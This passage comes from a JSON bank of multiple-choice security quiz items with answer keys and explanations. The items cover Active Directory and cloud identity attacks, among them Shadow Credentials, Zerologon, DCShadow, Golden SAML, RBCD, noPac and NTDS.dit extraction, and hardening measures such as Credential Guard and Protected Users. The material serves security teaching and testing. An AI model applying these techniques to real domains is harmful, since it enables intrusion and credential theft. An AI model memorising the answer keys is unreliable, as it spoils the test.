      "Writing attacker-controlled keys into an account’s msDS-KeyCredentialLink so the attacker can authenticate as that principal via PKINIT",
      "Disabling SMB signing and LDAP channel binding domain-wide with one GPO so NTLM relay to Certificate Services becomes the only step left",
      "Replacing the domain’s DANE TLSA records so LDAPS clients accept a forged certificate chain from any public Web PKI intermediate CA"
    ],
    "correct": 1,
    "explanation": "Shadow Credentials abuse the msDS-KeyCredentialLink attribute (often via Key Trust / Windows Hello for Business style keys) so an attacker who can write that attribute adds their key material and then obtains tickets as the victim using PKINIT. It is not krbtgt SPN unconstrained-delegation setup, a GPO that only disables signing/binding, or DANE TLSA replacement.",
    "difficulty": "Hard"
  },
  {
    "question": "On a Microsoft Entra ID–joined Windows device, what is a Primary Refresh Token (PRT) mainly used for?",
    "options": [
      "It is a one-time BitLocker recovery password escrowed only to Active Directory so offline disks can never unlock without a Domain Admin",
      "It is a local SAM hash of the enrolled user’s password that Windows replays to NTLM services when Kerberos is unavailable on that subnet",
      "It is a device-bound SSO refresh token that lets the user silently obtain access tokens for Entra ID–protected cloud apps and resources",
      "It is an Azure Storage shared access signature that grants anonymous write to every blob container in the tenant until the next password change"
    ],
    "correct": 2,
    "explanation": "A PRT is issued to Entra-joined/hybrid-joined devices and enables single sign-on: the device can obtain access tokens for cloud resources without prompting the user repeatedly. Theft/abuse of PRT material is a living-off-cloud style concern. It is not BitLocker escrow, a SAM/NTLM hash replay blob, or a tenant-wide anonymous SAS.",
    "difficulty": "Medium"
  },
  {
    "question": "In cloud environments, why is SSRF that reaches the instance metadata service (IMDS, e.g. 169.254.169.254) especially dangerous?",
    "options": [
      "It only lets an attacker change the VM hostname in DNS so TLS certificate pinning fails on the next reboot of every load balancer",
      "It permanently disables the hypervisor firewall so every guest can send spoofed BGP updates into the provider backbone without IAM checks",
      "It can expose temporary credentials or tokens that the instance role uses, letting the attacker call cloud APIs as that role",
      "It forces the guest OS to downgrade all outbound TLS to SSLv3 so packet captures on the VPC mirror can decrypt every HTTPS session"
    ],
    "correct": 2,
    "explanation": "IMDS often serves IAM role credentials (or similar short-lived tokens) to the instance. SSRF that can query that link-local endpoint can steal those credentials and abuse cloud APIs. It is not merely a hostname/DNS trick, a BGP spoof enabler, or an SSLv3 downgrade of all egress TLS.",
    "difficulty": "Medium"
  },
  {
    "question": "What does an OAuth device-code phishing attack mainly trick a victim into doing?",
    "options": [
      "Granting the attacker’s registered application consent by entering a short user code shown on a fake or attacker-controlled page",
      "Installing a malicious browser extension that rewrites every Authorization header to a static Bearer token stolen from LSASS",
      "Disabling MFA tenant-wide through a forged SAML assertion that the IdP accepts because the device code bypasses TLS entirely",
      "Replacing the tenant’s JWKS endpoint with a rogue key so every previously issued refresh token validates forever without expiry"
    ],
    "correct": 1,
    "explanation": "Device authorization flow shows a user code and a verification URI. Attackers phish victims into approving the attacker’s app (often via a convincing page), yielding tokens for the attacker. It is not an LSASS Bearer rewrite, an MFA-off SAML forge that skips TLS, or a permanent JWKS swap.",
    "difficulty": "Medium"
  },
  {
    "question": "On Windows, what does abusing SeImpersonatePrivilege (e.g. Potato-family techniques) mainly achieve for a local attacker?",
    "options": [
      "It rewrites the domain KRBTGT hash in AD so every TGT forged afterward is accepted as a Golden Ticket without needing DCSync rights",
      "It disables Windows Defender Tamper Protection by swapping the ELAM driver signature database with an unsigned offline copy on disk",
      "It forces every outbound SMB connection to fall back to NTLMv1 so a remote listener can capture crackable challenge-response pairs",
      "It lets a service account (or similar) impersonate a more privileged token on the host, often escalating to SYSTEM locally"
    ],
    "correct": 3,
    "explanation": "SeImpersonatePrivilege allows a process to impersonate clients that connect to it. Potato-style attacks coerce a privileged service to authenticate to the attacker’s pipe/listener and then impersonate that high-privilege token (often SYSTEM). It is not KRBTGT rewrite, ELAM/Tamper Protection bypass by itself, or a forced NTLMv1 downgrade of all SMB.",
    "difficulty": "Hard"
  },
  {
    "question": "What does a PetitPotam-style attack mainly coerce a Windows host (often a DC) into doing?",
    "options": [
      "Rewriting the domain KRBTGT hash on disk locally so every forged TGT validates afterward without needing any DCSync rights",
      "Disabling Credential Guard by replacing the VBS launch policy with an unsigned offline registry hive copied from another host",
      "Forcing every outbound SMB session down to NTLMv1 so a remote listener can capture and crack challenge-response pairs offline",
      "Authenticating to an attacker-controlled listener (often via MS-EFSRPC), enabling NTLM relay or related follow-on abuse"
    ],
    "correct": 3,
    "explanation": "PetitPotam abuses MS-EFSRPC (and similar) to coerce authentication toward an attacker. Combined with NTLM relay (or related techniques), that can lead to further domain compromise. It is not itself a KRBTGT rewrite, a Credential Guard bypass by hive swap, or a forced NTLMv1 downgrade of all SMB.",
    "difficulty": "Medium"
  },
  {
    "question": "What did the Zerologon vulnerability (CVE-2020-1472) mainly allow an attacker on the network to do against an unpatched domain controller?",
    "options": [
      "Read every BitLocker recovery key from Azure AD by spoofing only the Netlogon secure channel with an empty AES-GCM authentication tag",
      "Disable Windows Defender Tamper Protection remotely by setting the Netlogon machine account password literally to the string zerologon",
      "Spoof Netlogon secure-channel auth (all-zero IV flaw) and reset the DC machine account password to an empty or known value",
      "Forge Kerberos Golden Tickets without ever touching KRBTGT, because Netlogon replaced PAC validation on every subsequent TGS-REQ"
    ],
    "correct": 2,
    "explanation": "Zerologon abused a Netlogon crypto flaw (all-zero IV) so an attacker could impersonate a client and set the DC's machine account password to a known/empty value, enabling further takeover. It is not BitLocker key theft via empty GCM tags alone, a Defender Tamper Protection toggle, or Golden Tickets without KRBTGT.",
    "difficulty": "Hard"
  },
  {
    "question": "What does enabling Windows Credential Guard mainly protect against on a supported host?",
    "options": [
      "All Kerberos Golden Ticket forgery across the domain, because every DC refuses any TGT that was not sealed inside a VBS enclave",
      "Theft of derived credentials such as NTLM hashes or Kerberos tickets from LSASS by isolating those secrets with VBS",
      "Every NTLM relay attack on the LAN, because Credential Guard completely disables NetNTLM for all outbound SMB connections",
      "Ransomware encrypting local NTFS volumes, because VBS remaps disk clusters into an encrypted RAM-only scratch volume at boot"
    ],
    "correct": 1,
    "explanation": "Credential Guard uses virtualization-based security to isolate secrets so malware running as admin cannot simply dump them from LSASS. It does not stop domain-wide Golden Tickets by itself, disable all NetNTLM/relay, or act as anti-ransomware disk encryption.",
    "difficulty": "Medium"
  },
  {
    "question": "What does a DCShadow attack mainly abuse in Active Directory replication?",
    "options": [
      "It floods every domain controller with forged Kerberos TGTs so legitimate DCSync rights become unnecessary for reading password hashes",
      "It replaces the KRBTGT password hash on disk through a local offline edit, then waits for normal replication to push Golden Tickets domain-wide",
      "It coerces a workstation to authenticate via MS-EFSRPC so an attacker can relay NTLM to LDAP and enroll a rogue certificate as that computer",
      "It registers a rogue domain controller so attackers can push malicious object changes through normal AD replication channels"
    ],
    "correct": 3,
    "explanation": "DCShadow makes a machine act as a DC and injects attacker-controlled changes into AD replication. It is not PetitPotam coercion, offline KRBTGT editing, or flooding forged TGTs.",
    "difficulty": "Medium"
  },
  {
    "question": "Why do attackers sometimes add a backdoor ACE on the AdminSDHolder object in Active Directory?",
    "options": [
      "Because AdminSDHolder stores the KRBTGT hash in cleartext on disk, so any ACE there immediately grants DCSync without needing further replication steps",
      "Because every new computer account inherits AdminSDHolder ACLs at join time, turning a single ACE into domain-wide local admin on every workstation forever",
      "Because SDProp periodically copies AdminSDHolder's ACL onto protected privileged groups, so a planted ACE can reappear after admins clean those groups",
      "Because AdminSDHolder disables Kerberos pre-authentication for all Domain Admins, enabling AS-REP roasting against every privileged account at once overnight"
    ],
    "correct": 2,
    "explanation": "SDProp (Security Descriptor Propagator) reapplies AdminSDHolder's ACL to protected groups (e.g. Domain Admins) on a schedule. A backdoor ACE there can restore attacker rights after cleanup. It does not store KRBTGT in cleartext, grant workstation local admin, or disable preauth.",
    "difficulty": "Hard"
  },
  {
    "question": "How does overpass-the-hash (pass-the-key) differ from classic pass-the-hash against Active Directory?",
    "options": [
      "It dumps only LM hashes from the local SAM database and never touches Kerberos, so it works exclusively against hosts that still accept NTLMv1 on SMB shares",
      "It uses a stolen NT hash or AES key to request a real Kerberos TGT, then authenticates with tickets instead of presenting NTLM hashes on every hop",
      "It rewrites the domain KRBTGT key on every domain controller so existing Golden Tickets become the only valid credentials left anywhere in the forest",
      "It disables SMB signing forest-wide by pushing a malicious GPO through SYSVOL, forcing every NTLM challenge to accept empty responses from attackers"
    ],
    "correct": 1,
    "explanation": "Overpass-the-hash / pass-the-key turns a stolen key/hash into a Kerberos TGT (e.g. via mimikatz), so later access uses tickets rather than raw NTLM PtH on each resource. It is not LM-only, KRBTGT rewrite, or GPO-based signing disable.",
    "difficulty": "Medium"
  },
  {
    "question": "In a Golden SAML attack against a federated environment such as AD FS, what does the attacker mainly steal and abuse?",
    "options": [
      "The KRBTGT account hash, which lets the attacker sign Kerberos tickets that cloud apps accept directly without any federation server in the path",
      "The token-signing certificate private key, which lets the attacker forge SAML assertions for any user that trusting cloud services will accept",
      "The DHCP server database, which lets the attacker hand out a rogue identity provider address so every browser logs in to a fake portal instead",
      "The SMTP relay credentials, which let the attacker send password reset mails that automatically bypass MFA on every federated cloud service"
    ],
    "correct": 1,
    "explanation": "Golden SAML means stealing the federation server token-signing key and forging signed SAML assertions for any user, often bypassing MFA at the service provider. It is not KRBTGT abuse, DHCP spoofing, or SMTP relay misuse.",
    "difficulty": "Medium"
  },
  {
    "question": "An attacker can write to a target computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute and controls a machine account. What does resource-based constrained delegation abuse let them do?",
    "options": [
      "Reset the KRBTGT password on every domain controller so all existing tickets in the forest are revoked and only the attacker can request new ones",
      "Disable Kerberos pre-authentication on the target so its password hash can be requested offline and cracked like an AS-REP roasting victim",
      "Push a logon script to the target through SYSVOL so the next domain admin who signs in runs the payload with their own interactive session",
      "Use S4U2Self and S4U2Proxy from the controlled account to get a service ticket to the target as a privileged user, then access it as that user"
    ],
    "correct": 3,
    "explanation": "With write access to msDS-AllowedToActOnBehalfOfOtherIdentity, the attacker lets their machine account delegate to the target, then uses S4U2Self/S4U2Proxy to impersonate a privileged user to that host. It does not reset KRBTGT, disable pre-auth, or rely on SYSVOL scripts.",
    "difficulty": "Hard"
  },
  {
    "question": "On a Windows network that does not actively use IPv6, how does a mitm6-style attack usually get between clients and the network?",
    "options": [
      "It answers DHCPv6 requests as a rogue server and gives clients the attacker as DNS server, then captures or relays their authentication attempts",
      "It floods the switch CAM table with fake IPv4 MAC addresses so every port turns into a hub and the attacker can sniff all unicast traffic in the VLAN",
      "It brute-forces the domain controller over SMBv1 until a null session opens, then rewrites the IPv6 routing table on every domain member",
      "It sends spoofed STP BPDUs with priority 0 so the attacker laptop becomes root bridge and all IPv6 traffic is forced through its interface"
    ],
    "correct": 0,
    "explanation": "Windows prefers IPv6 and requests DHCPv6 by default. mitm6 answers as a rogue DHCPv6 server, sets itself as DNS, and then captures or relays authentication (for example to LDAP). Mitigate by blocking rogue DHCPv6/RA or disabling unused IPv6 and enforcing LDAP signing.",
    "difficulty": "Medium"
  },
  {
    "question": "On a Windows LAN where hosts still fall back to LLMNR or NBT-NS for name resolution, how does a Responder-style attack typically work?",
    "options": [
      "It patches the domain controller's SYSVOL share so every GPO pushes a fake DNS server address, which must happen before any LLMNR reply is accepted by clients",
      "It disables Kerberos on every workstation through remote WMI calls, forcing all authentication onto cleartext Telnet so passwords appear directly in packet captures",
      "It floods DHCP Offer packets with a rogue default gateway until the real DHCP server's lease pool is empty and every client loses all IP connectivity on the LAN",
      "It answers forged LLMNR/NBT-NS replies for names that fail DNS, then tricks victims into authenticating to the attacker to capture hashes or relay"
    ],
    "correct": 3,
    "explanation": "Responder-style tools poison LLMNR/NBT-NS by answering when DNS fails, then capture or relay the resulting authentication. They do not need SYSVOL GPO DNS changes, Kerberos disablement, or DHCP starvation as the core mechanism.",
    "difficulty": "Medium"
  },
  {
    "question": "In AD CS abuse, what does the ESC8 scenario mainly combine to obtain a certificate for a privileged machine or user context?",
    "options": [
      "Stealing the CA private key from an offline backup tape store and forging certificates forever without contacting the enrollment web service again at any time",
      "Relaying NTLM authentication to a certificate authority web enrollment endpoint (HTTP) that does not require EPA, then requesting a cert as the victim",
      "Enabling unconstrained Kerberos delegation on every published CA template so any domain workstation can mint domain-admin tickets with no certificate involved",
      "Replacing the domain root CA certificate inside Group Policy with a self-signed TLS certificate so intranet browsers trust attacker phishing sites by default"
    ],
    "correct": 1,
    "explanation": "ESC8 abuses NTLM relay to HTTP-based AD CS web enrollment when protections like EPA are missing, letting the attacker request a certificate in the relayed victim's context. It is not primarily offline CA-key theft, unconstrained delegation on templates, or swapping root CAs in GPO.",
    "difficulty": "Hard"
  },
  {
    "question": "After compromising a workstation, an attacker wants to decrypt a user's saved browser passwords and Wi-Fi keys protected by Windows DPAPI. What is a realistic approach?",
    "options": [
      "Simply read the encrypted blobs and open them in Notepad, because DPAPI stores all secrets as plaintext and the encryption header is only a cosmetic label on the file",
      "Obtain the user's masterkey (via their password/hash or the domain DPAPI backup key) and use it to decrypt the DPAPI-protected blobs for that user context",
      "Reboot the machine into safe mode, which Microsoft documents as the only supported way for any process to transparently remove DPAPI protection from stored credentials",
      "Change the user's password to a blank value, because setting an empty password automatically converts every existing DPAPI blob on disk into a cleartext copy for all apps"
    ],
    "correct": 1,
    "explanation": "DPAPI blobs are encrypted with a masterkey derived from the user's credentials; with the user's password/hash or the domain backup key, an attacker can recover the masterkey and decrypt saved secrets. The blobs are not plaintext, and safe mode or blanking the password does not strip DPAPI.",
    "difficulty": "Medium"
  },
  {
    "question": "With admin rights on a domain controller, an attacker wants every domain password hash offline. Why use a Volume Shadow Copy (vssadmin/ntdsutil) to grab NTDS.dit?",
    "options": [
      "Because NTDS.dit is stored as an unencrypted CSV of cleartext passwords, so copying it needs no shadow copy and any user can open it directly from the live system folder",
      "Because a shadow copy silently disables Active Directory replication to every other domain controller, which is required before Windows will allow the database file to be read at all",
      "Because the live NTDS.dit is locked by the directory service, so a shadow copy (or ntdsutil IFM) provides a consistent offline copy of the database and SYSTEM hive to extract hashes",
      "Because vssadmin automatically uploads NTDS.dit to Microsoft's cloud and emails the decrypted hashes to the operator, which is the only documented way to read the file remotely"
    ],
    "correct": 2,
    "explanation": "The live NTDS.dit is locked by NTDS, so attackers use a Volume Shadow Copy or ntdsutil IFM to obtain a consistent copy of the database plus the SYSTEM hive (for the boot key) and extract hashes offline. The file is encrypted, not a cleartext CSV, and shadow copies do not disable replication or exfiltrate to a cloud.",
    "difficulty": "Hard"
  },
  {
    "question": "A user completed MFA and has an active cloud session. An attacker steals the browser session cookie and replays it. Why can this bypass MFA?",
    "options": [
      "Because the session cookie already represents a fully authenticated session, so replaying a valid, unexpired cookie lets the attacker ride the session without redoing MFA",
      "Because stealing any cookie instantly reveals the user's cleartext password and current one-time code, which the browser always stores together inside every session cookie by design",
      "Because MFA tokens are only checked on the very first login of the device's lifetime, so no cloud service ever re-evaluates authentication once a machine has logged in once",
      "Because session cookies disable TLS for the whole domain, allowing the attacker to read all future traffic in plaintext and therefore skip multi-factor prompts entirely"
    ],
    "correct": 0,
    "explanation": "A session cookie represents an already-authenticated session; replaying a valid, unexpired cookie (pass-the-cookie) lets an attacker reuse the post-MFA session without re-authenticating. Cookies do not contain the cleartext password or OTP, MFA is not a one-time lifetime check, and cookies do not disable TLS.",
    "difficulty": "Medium"
  },
  {
    "question": "After gaining code execution as SYSTEM on a domain controller, an attacker wants any account to authenticate with one master password while real passwords still work. Which persistence technique matches?",
    "options": [
      "Pass-the-hash against a member workstation only, because replaying an NTLM hash on a laptop permanently rewrites every domain password hash stored in Active Directory to the same value",
      "Kerberoasting a single service account, because cracking one TGS ticket automatically installs a backdoor password that Active Directory accepts for every user in the forest forever",
      "Skeleton Key: inject a patch into LSASS on the DC so Kerberos (and often NTLM) accepts a chosen master password for any account, while legitimate passwords continue to work",
      "AS-REP roasting without pre-authentication, because collecting AS-REP hashes from users with UF_DONT_REQUIRE_PREAUTH is exactly how a universal master password is written into NTDS.dit"
    ],
    "correct": 2,
    "explanation": "Skeleton Key patches LSASS on a domain controller so a attacker-chosen master password works for any account alongside real passwords. Pass-the-hash, Kerberoasting, and AS-REP roasting do not install that DC-wide dual-password backdoor.",
    "difficulty": "Medium"
  },
  {
    "question": "A hardened Windows estate enforces application allowlisting with WDAC (or AppLocker). Why can living-off-the-land binaries still undermine that control?",
    "options": [
      "Because WDAC and AppLocker always disable every Microsoft-signed binary on disk, so attackers must bring unsigned malware and therefore allowlisting cannot be bypassed by design",
      "Because trusted, signed system tools (LOLBins) that remain allowed can be abused to download, decode, or spawn code, so attackers stay inside the allowlist while still executing payloads",
      "Because allowlisting stores every blocked hash in cleartext in the registry, and reading that list remotely removes the policy from every joined machine without any admin rights",
      "Because enabling WDAC automatically trusts any script or binary fetched over HTTP from the corporate proxy, which is documented as the supported exception path for line-of-business apps in production"
    ],
    "correct": 1,
    "explanation": "Allowlisting permits known-good binaries; LOLBins that stay trusted can still fetch or launch attacker code, so defence needs tighter rules and script controls. WDAC does not ban all Microsoft binaries, expose a cleartext bypass list, or auto-trust HTTP downloads.",
    "difficulty": "Hard"
  },
  {
    "question": "During a forest migration, an account keeps an old high-privilege SID in its SID History. Why is that dangerous across a forest trust, and what mitigates it?",
    "options": [
      "SID History is only a display name for the account and is never evaluated in access tokens, so keeping old SIDs cannot grant rights in the trusting forest under any configuration known today",
      "SID History forces Kerberos to disable AES and fall back to RC4 forever, which is the only security impact; resource access in the trusting domain is never affected by historical SIDs at all",
      "SID History is stripped automatically on every authentication across any trust type, so injecting a Domain Admins SID into SID History can never elevate access in another forest",
      "A forged or retained privileged SID in SID History can be added to the user's token and grant access in the trusting forest; SID filtering (quarantine) on the trust blocks those foreign SIDs"
    ],
    "correct": 3,
    "explanation": "SID History can carry group SIDs into the access token; across a forest trust that can elevate privileges unless SID filtering (quarantine) strips unexpected SIDs. It is not cosmetic, not only an encryption downgrade, and is not always stripped on every trust.",
    "difficulty": "Medium"
  },
  {
    "question": "During an AD assessment you find Groups.xml under SYSVOL that still contains a cpassword attribute from old Group Policy Preferences. Why is that still valuable to an attacker today?",
    "options": [
      "cpassword is an HMAC of the GPO version and only proves the file was edited; it never decrypts to a reusable credential under any documented Microsoft AES key published for that feature historically",
      "Microsoft published the static AES key used to protect GPP passwords, so anyone who can read SYSVOL can decrypt cpassword offline into cleartext credentials for the account it was set for",
      "cpassword encrypts only the local Administrator SID and cannot store domain user passwords, so the finding is limited to identifying whether LAPS was ever enabled on that OU in the past years",
      "Modern domain controllers strip cpassword on every SYSVOL replication, so a Groups.xml that still shows the attribute is always a false positive from an offline backup share that operators forgot to delete"
    ],
    "correct": 1,
    "explanation": "GPP stored passwords with a well-known AES key (MS14-025 era). Readable SYSVOL cpassword values decrypt offline to cleartext. It is not a mere HMAC, not limited to a local SID, and DCs do not auto-strip every legacy copy.",
    "difficulty": "Medium"
  },
  {
    "question": "In the noPac (CVE-2021-42278 / CVE-2021-42287) attack chain against Active Directory, what combination lets a low-privileged user escalate toward domain admin rights?",
    "options": [
      "Forcing every DC to disable PAC validation permanently by writing a single registry value under HKLM, which any authenticated user can set remotely through WinRM without other privileges on the domain controllers",
      "Poisoning LLMNR so that a DC authenticates to the attacker, then replaying that Net-NTLMv1 response as a Silver Ticket for the krbtgt account without ever touching machine accounts in the domain",
      "Exploiting PrintNightmare printer driver install rights on a workstation and then using that local SYSTEM token to dump LSASS on a neighboring DC over SMB signing-disabled links in the same site",
      "Creating (or renaming) a machine account whose sAMAccountName matches a DC name without the trailing $, then requesting a TGT and exchanging it so the PAC is issued as that domain controller"
    ],
    "correct": 3,
    "explanation": "noPac chains sAMAccountName spoofing (looking like a DC without $) with Kerberos TGT/TGS handling so the PAC is issued for the impersonated DC. It is not a simple HKLM flip by any user, not LLMNR-to-Silver-Ticket alone, and not PrintNightmare on a workstation.",
    "difficulty": "Hard"
  },
  {
    "question": "An attacker obtains the Directory Services Restore Mode (DSRM) password for a domain controller. In what situation does that credential become especially dangerous for persistence or recovery abuse?",
    "options": [
      "When DSRM login is allowed as a local break-glass account on a DC that is online (registry DsrmAdminLogonBehavior), the password acts like a local Administrator secret that survives many domain password rotations",
      "When the DSRM password is typed into any member workstation's local Administrator account, it automatically syncs through SYSVOL and becomes the domain krbtgt password on the next replication cycle across every site",
      "When Azure AD Connect is installed, the DSRM secret is mirrored into the cloud tenant as a Global Admin app password that cannot be rotated from on-premises tools under any supported hybrid topology today",
      "When Credential Guard is enabled, DSRM credentials are the only secrets still stored in cleartext LSASS and therefore the preferred target for every dump tool on that host during an offline forensic capture"
    ],
    "correct": 0,
    "explanation": "DSRM is the local SAM Administrator-equivalent on a DC. With DsrmAdminLogonBehavior allowing logon while AD DS is running, it is a durable break-glass secret independent of normal domain account rotation. It does not become krbtgt, does not auto-become Azure Global Admin, and Credential Guard is unrelated to inventing that property.",
    "difficulty": "Medium"
  },
  {
    "question": "A principal in the DNSAdmins group can load a DLL via the DNS Server's server-level plugin path. Why is that often treated as a privilege-escalation path to the Domain Controller?",
    "options": [
      "Because DNSAdmins membership alone grants Domain Admin rights in every forest functional level, so the DLL load is only a cosmetic log event and not needed for privilege gain on the DC across every site in the forest without needing any further ACL change on the DNS zone or service account.",
      "Because the plugin path writes a scheduled task under SYSTEM that runs once at next reboot and then removes the principal from DNSAdmins, leaving no lasting code execution on the server after which the assessor loses the DLL path and must re-join DNSAdmins before another load attempt can succeed on that host.",
      "Because loading any DLL into dns.exe requires the SeDebugPrivilege that only Enterprise Admins hold, so DNSAdmins cannot actually force the load without a second privileged account even when the server-level plugin registry value is already writable by that nested security group on the DC.",
      "Because the Microsoft DNS Server service often runs as SYSTEM on a DC, so a malicious server-level plugin DLL (for example via serverlevelplugindll) executes code in that high-privilege context"
    ],
    "correct": 3,
    "explanation": "On many DCs the DNS Server service runs as SYSTEM. Members of DNSAdmins can configure a server-level plugin DLL that dns.exe loads, yielding SYSTEM code execution and a path toward Domain Admin. DNSAdmins is not Domain Admin by itself; the risk is the privileged service context, not a scheduled-task trick or a SeDebugPrivilege gate that blocks DNSAdmins entirely.",
    "difficulty": "Medium"
  },
  {
    "question": "During an AD assessment you want the current password of a group Managed Service Account (gMSA). Which attribute / API path is typically used to retrieve the managed password blob for principals allowed to do so?",
    "options": [
      "Reading msDS-ManagedPassword (via LDAP with the right principals in PrincipalsAllowedToRetrieveManagedPassword) returns a blob the client can use to derive the current gMSA password",
      "Dumping the clear-text password from the userPassword attribute on the gMSA object, which Active Directory always stores reversibly for every managed service account by default",
      "Calling NetUserGetInfo level 3 against the gMSA sAMAccountName from any domain user, because gMSA passwords are intentionally readable by Authenticated Users for Kerberos SPN checks",
      "Extracting the password from the gMSA's UnicodePwd attribute over anonymous LDAP bind, which Windows permits specifically for msDS-GroupManagedServiceAccount objects"
    ],
    "correct": 0,
    "explanation": "gMSA passwords are retrieved by allowed principals through the constructed attribute msDS-ManagedPassword (often via LDAP), not from a world-readable clear-text userPassword, not via NetUserGetInfo for any domain user, and not over anonymous UnicodePwd binds. Membership in PrincipalsAllowedToRetrieveManagedPassword (or equivalent rights) controls who can get the blob.",
    "difficulty": "Hard"
  },
  {
    "question": "Why do hardening guides push LDAP signing and LDAP channel binding on domain controllers?",
    "options": [
      "They replace Kerberos entirely with NTLM for directory binds, which simplifies ticket handling and removes the need to rotate krbtgt after a suspected compromise of a domain controller and without renewing any service account passwords that bind to the directory over LDAP.",
      "They force every LDAP client to use LDAPS on port 636 only, so plain TCP/389 is firewalled and no unsigned Simple binds can ever reach the directory from inside the corporate network without needing StartTLS, client certificates, or any per-site firewall exception list.",
      "Signing protects LDAP traffic integrity and channel binding ties the LDAP session to the TLS channel, reducing relay and tampering risks against directory binds (including StartTLS / LDAPS scenarios)",
      "They disable all Simple binds and anonymous rootDSE queries, which alone stops BloodHound enumeration even when a valid domain user credential is already available to the assessor and without locking down SMB signing or other lateral-movement paths on member servers."
    ],
    "correct": 2,
    "explanation": "LDAP signing ensures integrity of LDAP messages; channel binding associates the LDAP exchange with the underlying TLS channel so a relayed bind is harder to pull off. They do not replace Kerberos with NTLM, do not by themselves firewall 389, and do not alone stop BloodHound when a user credential exists.",
    "difficulty": "Medium"
  },
  {
    "question": "An admin account is added to the Active Directory 'Protected Users' group. Which effect does that membership have?",
    "options": [
      "The account becomes exempt from password expiry and lockout policies so that domain administrators are never blocked out during an incident or a brute-force attack",
      "NTLM, DES/RC4 Kerberos pre-auth and credential delegation are blocked for it, and its TGTs are short and non-renewable, which limits credential theft and reuse",
      "Its password hash is removed from the domain controllers, so the account can only sign in with a smart card and replication never copies its credentials to other DCs",
      "All of its logons are routed through a jump server automatically, so its sessions can never reach workstations even when the user types its credentials there"
    ],
    "correct": 1,
    "explanation": "Protected Users hardens member accounts: no NTLM, no DES or RC4 in Kerberos pre-authentication, no unconstrained or constrained delegation, no cached plaintext credentials via CredSSP/WDigest, and a 4-hour non-renewable TGT. It does not remove lockout, delete hashes from DCs, or force jump-server logons. It is meant for user accounts, not service or computer accounts.",
    "difficulty": "Medium"
  },
  {
    "question": "In a 'Timeroasting' attack, an unauthenticated attacker sends MS-SNTP time requests to a domain controller. What do they gain, and when is it dangerous?",
    "options": [
      "The DC returns the clear-text krbtgt password inside the NTP reply, so any host that can reach UDP 123 can forge Golden Tickets without cracking anything offline",
      "The DC shifts its clock by the offset in the request, so Kerberos tickets across the domain expire and users fall back to NTLM, which the attacker then relays freely",
      "Replies are signed with a MAC derived from the requested computer account's NT hash, which can be cracked offline when machine passwords are weak or set by hand",
      "The DC discloses every user's last logon time and source IP in the reply, giving the attacker a full session map without needing any domain credentials at all"
    ],
    "correct": 2,
    "explanation": "With MS-SNTP, a DC signs time responses using a key derived from the NT hash of the computer account whose RID is in the request. An attacker can ask for many RIDs without authenticating and crack the results offline. It mainly hits computer accounts with weak or manually set passwords (for example pre-created or 'pre-Windows 2000' accounts); normal auto-rotated machine passwords are effectively uncrackable. It does not leak krbtgt, change the DC clock, or list user logons.",
    "difficulty": "Hard"
  },
  {
    "question": "In the Active Directory tiered administration model, what is the core rule for Tier 0 admin accounts?",
    "options": [
      "They log on only to Tier 0 assets (DCs, AD CS, identity sync servers), never to servers or workstations in lower tiers, so their credentials cannot be stolen there",
      "They must log on to every workstation once a week to verify patches, because only Tier 0 accounts have rights to read the local security logs on user endpoints",
      "They are shared by the whole help desk under one password, so that any technician can reset users quickly and audit trails stay limited to a single privileged identity",
      "They are allowed anywhere as long as MFA is enabled, since MFA prevents their password hashes and Kerberos tickets from being left in the memory of lower-tier hosts"
    ],
    "correct": 0,
    "explanation": "Tier 0 covers the identity control plane: domain controllers, AD CS, AD FS, sync servers and their admins. Those credentials must only be used on Tier 0 systems; logging on to a Tier 1 server or a Tier 2 workstation leaves hashes or tickets there for an attacker to steal. Routine endpoint work belongs to lower-tier accounts, shared admin accounts break accountability, and MFA at sign-in does not stop credentials being cached in memory.",
    "difficulty": "Medium"
  },
  {
    "question": "Why do AD hardening guides recommend setting ms-DS-MachineAccountQuota to 0 on the domain?",
    "options": [
      "Because a non-zero quota lets every computer account log on interactively to domain controllers, which exposes them to credential theft by any user of that machine",
      "Because the default quota of 10 makes each domain controller replicate computer objects ten times, which slows logons and lets attackers inject fake replication data",
      "By default any authenticated user can join up to 10 computers, giving attackers a machine account they control for attacks such as RBCD abuse or noPac",
      "Because a quota above zero disables Kerberos for new computers and forces them to use NTLM, which attackers can relay to the domain controller to obtain admin rights"
    ],
    "correct": 2,
    "explanation": "ms-DS-MachineAccountQuota defaults to 10, so any authenticated user can create up to 10 computer accounts. An attacker-controlled machine account (with a known password and SPN) is a key step in attacks such as resource-based constrained delegation abuse, noPac and some relay chains. Setting it to 0 and delegating domain joins to a specific group removes that foothold. It does not affect DC logon rights, replication or Kerberos versus NTLM.",
    "difficulty": "Medium"
  },
  {
    "question": "In an AD-integrated DNS zone, an attacker with only a normal domain user account adds a wildcard (*) record pointing to their own IP. What does this achieve?",
    "options": [
      "It replaces the A records of all domain controllers, so every Kerberos ticket request is sent to the attacker, who can then issue forged TGTs to any user in the domain",
      "Names that have no existing record now resolve to the attacker, so mistyped or stale hostnames send traffic and NTLM authentication to them, much like LLMNR poisoning",
      "It turns on DNS zone transfers to the attacker's IP, letting them download every record in the zone, but no client traffic is redirected and no credentials are exposed",
      "It forces all clients to drop DNSSEC validation, so the attacker can now answer for any public domain on the Internet and steal TLS certificates issued for those sites"
    ],
    "correct": 1,
    "explanation": "By default authenticated users can create new records in AD-integrated DNS zones (ADIDNS). A wildcard record answers for any name that does not already exist, so typos and decommissioned hostnames resolve to the attacker, who can capture or relay NTLM authentication, similar to LLMNR/NBT-NS poisoning but domain-wide. Existing records such as DC A records are not overwritten, zone transfers and DNSSEC are separate settings. Mitigate by restricting record creation and pre-creating a wildcard record.",
    "difficulty": "Hard"
  },
  {
    "question": "What does enabling LSA protection (RunAsPPL) on a Windows host mainly do?",
    "options": [
      "It encrypts the SAM database with a key stored in the TPM, so offline attackers who copy the disk cannot read local password hashes without the original motherboard",
      "It blocks all NTLM authentication from the host and forces Kerberos for every connection, so pass-the-hash tools fail even when the attacker already has local admin",
      "It moves cached domain credentials into a virtual machine isolated by the hypervisor, so even code running in the kernel of the host cannot read those secrets",
      "It runs LSASS as a Protected Process Light, so even local admins cannot open it to read memory or load unsigned plugins, blocking common credential dumping"
    ],
    "correct": 3,
    "explanation": "LSA protection runs lsass.exe as a Protected Process Light (PPL). Non-protected processes, even with admin rights and SeDebugPrivilege, cannot open it to read memory or inject code, and only signed LSA plugins load, which blocks tools like Mimikatz's sekurlsa without a kernel driver. Isolating secrets in a hypervisor-protected VM is Credential Guard; it does not encrypt the SAM with the TPM or disable NTLM.",
    "difficulty": "Medium"
  },
  {
